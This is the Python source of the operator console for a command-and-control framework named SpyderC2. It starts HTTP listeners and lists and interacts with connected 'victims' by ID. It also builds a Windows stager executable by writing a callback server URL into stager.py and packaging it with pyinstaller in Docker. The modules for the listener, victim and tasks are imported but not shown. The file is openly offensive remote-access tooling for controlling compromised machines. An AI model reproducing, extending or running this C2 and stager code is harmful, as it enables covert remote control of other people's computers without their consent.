
import pdb
import pymongo
import re
import os
import shutil
import subprocess
import argparse
from lib.logger import Logger
from termcolor import colored
import datetime
import pathlib

## Provides command history like bash to input
import readline

## Full path of the current script
PATH = os.path.dirname(os.path.realpath(__file__))

def parser():
	parser = argparse.ArgumentParser(description='Python based C2')
	
	parser.add_argument('-g', '--generate', help = 'Generates exe', action='store_true')
	parser.add_argument('-v', '--verbose', help = 'Generates exe', action='store_true')
	args = parser.parse_args()
	return args


def display_main_help_menu():
	print(' --------------------------------------')
	print('|          SERVER HELP MENU            |')
	print(' --------------------------------------')
	commands = {'http':'Starts a new http listener.' , 'jobs': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in ./tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}

	for command in commands.keys():
		print(colored(command,'cyan') + " - " + commands[command])

## Checks if we are running on docker container
def docker():
	return os.path.isfile('/.dockerenv')

## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
def fill_server_url():
	print(colored("Enter server URL",'cyan'))
	server_url = str(input())
	stager_path = os.path.join(PATH,'stager.py')

	stager_content = open(stager_path,'r').read()
	stager_content = stager_content.replace("##SERVER_URL##",server_url)

	new_stager_path = os.path.join(PATH,'tmp/stager.py')

	f = open(new_stager_path,'w+')
	print(stager_content,file=f)
	f.close()

def generate_stager():
	
	## Convert to exe and save
	# if os.path.exists('./tmp'):
	# 	shutil.rmtree('./tmp')


	## For linux bianry : docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux
	# os.mkdir('./tmp')

	fill_server_url()
	try:
		subprocess.check_output(f"cp {os.path.join(PATH,'stager.spec')} {os.path.join(PATH,'tmp')}",shell=True)
		subprocess.check_output(f"cp {os.path.join(PATH,'requirements.txt')} {os.path.join(PATH,'tmp')}",shell=True)

		if not docker():
			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'tmp')}",shell=True)
			print(colored("exe dumped to ./tmp",'green'))
		else:
			print(colored('Please run : '+colored('sudo docker run -v "<path_to_SpyderC2>/data/tmp:/src/" cdrx/pyinstaller-windows','cyan')+' on the host machine. The stager will be generated in <path_to_SpyderC2>/data/tmp'))
	except subprocess.CalledProcessError as grepexc:                                                                                                   
		print(colored(f"exe generation failed ","red"))


def main(args,db_object,server_logger):
	myclient = db_object.mongoclient

	if args.generate:
		## Import stager code and convert to exe
		generate_stager()

	display_main_help_menu()
	print()

	while True:
		print(colored("Enter server commands",'blue'))
		cmd = str(input())

		if cmd == 'http':
			h = Listener(port="8080")
			
			h.start_listener()
			server_logger.info_log("Started http listener.",'green')

		elif cmd == 'listeners':
			Listener.show_listeners()

		elif cmd == 'kill_listeners':
			Listener.kill_all_listeners()


		elif cmd == 'generate':
			generate_stager()
			

		elif cmd == 'victims':
			## Load victims from db everytime and instatiate objects. TODO - any effcient approach?
			Victim.load_victims_from_db()
			Victim.show_victims()

		## Matching use LKF0599NMU
		elif re.match(r'^use [\w\d]{1,10}$',cmd):

			Victim.load_victims_from_db()
			victim_id = re.findall(r'^use ([\w\d]{1,10})$',cmd)[0]

			## Supporting Regex to quickly interact with part of ID.
			r = re.compile(victim_id+".*")
			matched = list(filter(r.match, Victim.victims.keys()))

			if len(matched) == 0 :
				server_logger.info_log("No victims found with that ID",'yellow')
			elif len(matched) == 1 :
				victim_id = matched[0]
				server_logger.info_log(f"Interacting with {victim_id}",'green')
				Victim.victims[victim_id].victim_menu()
			else:
				server_logger.info_log("Multiple victims found, Please provide full or unique ID.",'yellow')


		elif cmd == 'help':
			display_main_help_menu()

		elif cmd == 'exit':
			Listener.kill_all_listeners()
			db_object.drop_db()
			break

		print()

def get_db_info():
	if 'MONGODB_USERNAME' not in os.environ: 
		print(colored("Enter mongodb username",'blue'))
		os.environ['MONGODB_USERNAME'] = str(input())

	if 'MONGODB_PASSWORD' not in os.environ: 
		print(colored("Enter mongodb password",'blue'))
		os.environ['MONGODB_PASSWORD'] = str(input())

	if 'MONGODB_HOSTNAME' not in os.environ: 
		os.environ['MONGODB_HOSTNAME'] = '127.0.0.1'

	if 'MONGODB_DATABASE' not in os.environ: 
		os.environ['MONGODB_DATABASE'] = 'SpyderC2'

	print(colored("You can set these environment variables - MONGODB_USERNAME , MONGODB_PASSWORD , MONGODB_HOSTNAME , MONGODB_DATABASE",'blue'))

	db_url = "mongodb://"
	if os.environ['MONGODB_USERNAME'] != '' and os.environ['MONGODB_PASSWORD'] != '':
		db_url += f"{os.environ['MONGODB_USERNAME']}:{os.environ['MONGODB_PASSWORD']}@"
		
	db_url += f"{os.environ['MONGODB_HOSTNAME']}:27017/{os.environ['MONGODB_DATABASE']}"

	return db_url





if __name__=="__main__":
	args = parser()
	db_url = get_db_info()
	from lib.listener import Listener
	from lib.database import Database
	from lib.task import Task
	from lib.victim import Victim

	## Setting up logging
	server_logger = Logger(logdir='logs',logfile='logs',verbose=args.verbose )
	server_logger.setup()

	## launches the log in new screen
	server_logger.launch_logs_screen()
	

	server_logger.info_log(f"Initiated database connection from main- {db_url}",'green')

	db_object = Database(url=db_url)
	Listener.mongoclient = db_object.mongoclient
	Victim.mongoclient = db_object.mongoclient
	Task.mongoclient = db_object.mongoclient

	try:
		main(args,db_object,server_logger)
	except KeyboardInterrupt:
		Listener.kill_all_listeners()
		db_object.drop_db()